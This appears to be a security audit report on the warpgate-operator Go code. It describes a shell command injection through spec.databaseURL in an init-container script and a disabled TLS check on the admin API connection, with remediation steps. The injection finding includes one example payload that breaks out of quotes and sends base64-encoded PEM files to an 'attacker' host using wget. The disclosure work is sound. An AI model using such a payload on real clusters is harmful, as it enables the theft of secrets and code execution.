summary: Reviewed the warpgate-operator Go sources under api/v1alpha1, cmd/ and internal/ (controllers, the Warpgate REST client, and the admission webhooks). The operator manages Warpgate instances and their users/targets/credentials/tickets, reading secrets from the cluster and driving the Warpgate admin API. The most significant issue is a shell command injection in the WarpgateInstance init-container script built from unvalidated spec fields; there is also a hardcoded TLS-verification bypass on the auto-created admin connection. Credential handling (crypto/rand passwords, secret storage, no secret logging) is otherwise sound. Coverage was the reachable Go code in scope; generated CRD manifests, Helm charts, config/ and tests were not deeply audited.

findings.title: Shell command injection via spec.databaseURL in WarpgateInstance init-container script
findings.description: buildDeployment() assembles an init-container command by string-concatenating WarpgateInstance spec fields and running the result via `/bin/sh -c initScript` (Command at line 776). spec.databaseURL is interpolated into the setup command as `--database-url "%s"` with no escaping or validation. A value such as `x"; wget http://attacker/$(cat /data/*.pem | base64); echo "` breaks out of the double quotes and executes arbitrary commands. Neither the CRD (api/v1alpha1/warpgateinstance_types.go:83-86, a free-form string) nor the admission webhook (api/v1alpha1/warpgateinstance_webhook.go validateWarpgateInstance) constrains the value. The injected commands run in the init container, which has the admin password mounted as the ADMIN_PASSWORD env var (lines 778-790) sourced from spec.adminPasswordSecretRef — an attacker-chosen Secret name — so a tenant who can create/update a WarpgateInstance but cannot otherwise read that Secret can exfiltrate it, and can run arbitrary code in the namespace. The same class of injection reaches the generated warpgate.yaml: buildWarpgateConfig writes spec.databaseURL (line 345) and spec.externalHost (line 380) into YAML unescaped, allowing newline-based YAML config injection.
findings.evidence:
line 557: setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL)
line 611: initScript := strings.Join(scriptParts, "\n")
line 776: Command: []string{"/bin/sh", "-c", initScript}
Source: WarpgateInstance.Spec.DatabaseURL (unvalidated string) -> setupCmd -> initScript -> sh -c
findings.recommendation: Do not build the setup invocation as a shell string. Pass warpgate as an argv slice (Command/Args) so arguments are not re-parsed by a shell, or strictly validate spec.databaseURL against an allowed URL scheme/charset in the webhook and reject shell metacharacters. Likewise emit warpgate.yaml with a real YAML encoder (or quote/escape databaseURL and externalHost) instead of fmt.Fprintf.

findings.title: TLS certificate verification disabled for operator-to-Warpgate admin connection
findings.description: ensureWarpgateConnection() hardcodes InsecureSkipVerify: true on the auto-created WarpgateConnection that the operator later uses to authenticate to the Warpgate admin API with the instance admin credentials (username admin + password). With verification disabled, any party able to intercept or impersonate the in-cluster HTTPS service (e.g. via service/DNS hijacking or a man-in-the-middle within the cluster network) can capture the admin credentials or the session and gain full control of the Warpgate instance. The client honours this flag in internal/warpgate/client.go:55-59, and getWarpgateClient/buildClient propagate the same InsecureSkipVerify field for user-defined connections.
findings.recommendation: Provision the instance's serving certificate from a CA the operator trusts (e.g. cert-manager, already supported) and pin/verify against that CA instead of skipping verification. If a self-signed bootstrap cert is unavoidable, load its CA bundle into the client's RootCAs rather than disabling verification entirely.
